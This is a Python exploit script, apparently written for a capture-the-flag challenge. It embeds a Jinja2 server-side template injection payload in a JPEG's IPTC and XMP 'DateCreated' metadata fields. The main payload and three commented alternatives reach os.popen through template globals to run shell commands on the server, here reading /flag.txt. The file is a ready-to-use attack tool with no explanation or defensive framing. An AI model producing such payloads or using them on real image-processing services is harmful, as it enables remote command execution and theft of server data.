# patch_jpeg_datecreated.py
# Usage: python3 patch_jpeg_datecreated.py input.jpg output.jpg
import sys, struct

# SSTI payload to read /flag.txt
# Try these payloads in order of reliability:
PAYLOAD = b"{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}"
# Alternative payloads if the above doesn't work:
# PAYLOAD = b"{{lipsum.__globals__.os.popen('cat /flag.txt').read()}}"
# PAYLOAD = b"{{cycler.__init__.__globals__.os.popen('cat /flag.txt').read()}}"
# PAYLOAD = b"{{joiner.__init__.__globals__.os.popen('cat /flag.txt').read()}}"

def find_insert_pos(jpg: bytes) -> int:
    # Parse markers until Start Of Scan (SOS, 0xFFDA); insert before SOS
    i = 2  # skip SOI (FFD8)
    n = len(jpg)
    while i+1 < n:
        if jpg[i] != 0xFF:
            # skip fill bytes until next marker
            i += 1
            continue
        # collapse FF padding
        while i < n and jpg[i] == 0xFF:
            i += 1
        if i >= n: break
        marker = jpg[i]
        i += 1
        if marker in (0xD8, 0xD9):   # SOI/EOI (no length)
            continue
        if marker == 0xDA:           # SOS -> insert before this marker
            return i-2
        if i+2 > n: break
        seg_len = struct.unpack(">H", jpg[i:i+2])[0]
        i += seg_len
    # fallback: before EOI or at end
    return n-2 if n >= 2 and jpg[-2:] == b"\xFF\xD9" else n

def mk_app13_iptc_date_created(value: bytes) -> bytes:
    # Build IPTC IIM record: 0x1C 0x02 0x37 (2:55 Date Created) + length + data
    iptc = b"\x1C\x02\x37" + struct.pack(">H", len(value)) + value
    # Wrap in Photoshop IRB (8BIM, resource 0x0404, empty name, size, data)
    irb = b"8BIM" + struct.pack(">H", 0x0404) + b"\x00"  # empty Pascal name
    if len(irb) % 2: irb += b"\x00"
    irb += struct.pack(">I", len(iptc)) + iptc
    if len(iptc) % 2: irb += b"\x00"
    # APP13 payload "Photoshop 3.0\0" + IRB
    payload = b"Photoshop 3.0\x00" + irb
    return b"\xFF\xED" + struct.pack(">H", len(payload)+2) + payload

def mk_app1_xmp_date_created(value: bytes) -> bytes:
    # Minimal XMP packet with photoshop:DateCreated set to raw string value
    xmp_id = b"http://ns.adobe.com/xap/1.0/\x00"
    xpacket_head = b'<?xpacket begin="\\ufeff" id="W5M0MpCehiHzreSzNTczkc9d"?>'
    xpacket_tail = b'<?xpacket end="w"?>'
    xml = (
        b'<x:xmpmeta xmlns:x="adobe:ns:meta/">'
        b'<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">'
        b'<rdf:Description xmlns:photoshop="http://ns.adobe.com/photoshop/1.0/" '
        b'photoshop:DateCreated="' + value + b'"/>'
        b'</rdf:RDF></x:xmpmeta>'
    )
    pkt = xpacket_head + xml + xpacket_tail
    payload = xmp_id + pkt
    return b"\xFF\xE1" + struct.pack(">H", len(payload)+2) + payload

def inject_segments(inp: bytes, segments: list[bytes]) -> bytes:
    pos = find_insert_pos(inp)
    return inp[:pos] + b"".join(segments) + inp[pos:]

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 patch_jpeg_datecreated.py input.jpg output.jpg")
        sys.exit(1)
    src, dst = sys.argv[1], sys.argv[2]
    data = open(src, "rb").read()
    app13 = mk_app13_iptc_date_created(PAYLOAD)           # IPTC 2:55
    app1  = mk_app1_xmp_date_created(PAYLOAD)             # XMP photoshop:DateCreated
    patched = inject_segments(data, [app13, app1])
    open(dst, "wb").write(patched)
    print(f"Wrote {dst} with IPTC 2:55 and XMP DateCreated = {PAYLOAD.decode()}")

if __name__ == "__main__":
    main()